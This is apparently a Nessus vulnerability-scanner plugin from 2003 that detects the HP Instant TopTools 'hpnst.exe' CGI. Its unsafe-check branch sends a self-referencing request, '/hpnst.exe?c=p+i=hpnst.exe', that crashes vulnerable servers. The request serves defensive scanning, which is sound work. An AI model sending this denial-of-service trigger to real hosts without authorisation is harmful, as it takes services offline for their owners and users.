#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11520);
 script_cve_id("CAN-2003-0169");
 script_version("$Revision: 1.3 $");
 
 name["english"] = "HP Instant TopTools DoS";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host has the CGI 'hpnst.exe' installed.

Older versions of this CGI (pre 5.55) are vulnerable
to a denial of service attack where the user can make
the CGI request itself.

Solution : upgrade to version 5.55
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for hpnst.exe";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

if(safe_checks() == 0)
{
 if(http_is_dead(port:port))exit(0);
 foreach dir (cgi_dirs())
 {
   req = http_get(item:string(dir, "/hpnst.exe?c=p+i=hpnst.exe"), port:port);
   res = http_keepalive_send_recv(port:port, data:req);
   if(res == NULL && http_is_dead(port:port)){ security_hole(port); exit(0); }
 }
 
exit(0);
}


res = is_cgi_installed(port:port, item:"hpnst.exe");
if(res != 0) {
 
 report = "The remote host has the CGI 'hpnst.exe' installed.

Older versions of this CGI (pre 5.55) are vulnerable
to a denial of service attack where the user can make
the CGI request itself.

*** As safe checks are enabled, Nessus did not really test
*** for this flaw, so this might be a false positive

Solution : upgrade to version 5.55
Risk factor : High";

  security_hole(port:port, data:report);
}
